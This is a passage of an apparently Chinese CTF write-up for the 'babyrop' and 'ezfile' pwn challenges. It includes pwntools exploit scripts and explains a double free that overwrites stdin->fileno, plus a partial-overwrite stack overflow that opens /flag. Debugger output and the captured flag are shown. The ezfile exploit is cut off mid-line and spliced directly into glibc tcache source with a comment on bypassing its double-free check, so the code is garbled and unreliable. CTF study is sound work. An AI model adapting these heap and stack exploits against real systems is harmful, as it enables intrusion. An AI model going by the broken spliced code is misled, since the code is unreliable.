            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def main(host,port=17676):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./babyrop")
            # gdb.attach(p)
            debug(0x000000000000CB2)    
        payload = "((V"+p32(0)+"44V"+p32(0x24a3a)+"!44444"
        p.send(payload.ljust(0x100,"\x00"))
        p.interactive() 
    if __name__ == "__main__":
        main(args['REMOTE'])
## ezfile
这题在给了hint后，想了很久，然后想起今年国赛有一题是吧`stdin`的`fileno`改为666，然后利用`scanf`和`printf`把`flag`打印出来，然后手动试了下这题，居然也可以。
这题有两个漏洞，一个是`deleteNote`没有把指针置零,一个是`encryptNode`函数的栈溢出，思路就是利用`double
free`修改`stdin->fileno`为3，然后利用栈溢出`partial overwirte`改`encryptNode`返回地址到
    .text:0000000000001147                 mov     eax, 0
    .text:000000000000114C                 call    _open
    .text:0000000000001151                 mov     cs:fd, eax
    .text:0000000000001157                 mov     eax, cs:fd
    .text:000000000000115D                 cmp     eax, 0FFFFFFFFh
至于为什么可以`open /flag`,是因为在`encryptNode`返回时
    RDI  0x7ffce9258610 ◂— 0x67616c662f /* '/flag' */
     RSI  0x0
     R8   0x7ffce92585f3 ◂— 0x1000000000a /* '\n' */
     R9   0x0
     R10  0x7f9c58fe5cc0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
     R11  0x246
     R12  0x55bdf8ef4980 ◂— xor    ebp, ebp
     R13  0x7ffce9258770 ◂— 0x1
     R14  0x0
     R15  0x0
     RBP  0x7ffce9258670 ◂— 0x0
     RSP  0x7ffce9258610 ◂— 0x67616c662f /* '/flag' */
     RIP  0x55bdf8ef50e3 ◂— leave  
    ───────────────────────────────────[ DISASM ]───────────────────────────────────
     ► 0x55bdf8ef50e3    leave  
       0x55bdf8ef50e4    ret    
        ↓
       0x55bdf8ef5147    mov    eax, 0
`RDI`会指向我们输入的内容，`RSI`就是`doSomeThing(seed,
index)`的`index`参数，都是可控的，所以跳到`open`函数可以打开`/flag`,然后在配合
    __isoc99_scanf("%90s", name);
      printf("welcome!%s.\n", name);
这样就会把flag打印出来
    [*] welcome!d3ctf{3z_FIL3N0~@TT@cK-WIth-ST@Ck_0V3RFI0W}.
由于攻击到`stdin->fileno`我猜了两次地址，一次是堆地址，一次是libc地址，这样就1/256的几率，然后最后栈溢出的`patial
overwrite`又要来一次1/16,所以最后成功几率是1/4096，出题人说还可以更低，orz
exp为：
    from pwn import *
    context.arch='amd64'
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def cmd(command):
        p.recvuntil(">>")
        p.sendline(str(command))
    def add(sz,content):
        cmd(1)
        p.recvuntil("size of your note >>")
        p.sendline(str(sz))
        p.recvuntil("content >>")
        p.send(content)
    def enc(idx,sz,seed):
        cmd(3)
        p.sendlineafter("encrypt >>",str(idx))
        p.sendlineafter("(max 0x50) >>",str(sz))
        p.sendafter("seed >>",seed)
    def dele(idx):
        cmd(2)
        p.sendlineafter("delete >>",str(idx))
    def main(host,port=24694):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./ezfile")
            # p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
            # gdb.attach(p)
            debug(0x0000000000010E3)
        p.recvuntil("your name: ")
        p.sendline("A")
        add(0x10,p64(0)+p64(0x21))
        add(0x10,p64(0)+p64(0x21))
        # t = int(raw_input("guess: "))
        t = 11
        heap = (t  chance), so verify it's not an unlikely
           coincidence before aborting.  */
        if (__glibc_unlikely (e->key == tcache))    //如果我们可以把e->key即chunk的bk指针修改掉，那就可以绕过这个check
          {
            tcache_entry *tmp;
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
            for (tmp = tcache->entries[tc_idx];
             tmp;
             tmp = tmp->next)
              if (tmp == e)
            malloc_printerr ("free(): double free detected in tcache 2");
            /* If we get here, it was a coincidence.  We've wasted a
               few cycles, but don't abort.  */
          }
        if (tcache->counts[tc_idx] < mp_.tcache_count)
          {
            tcache_put (p, tc_idx);
            return;
          }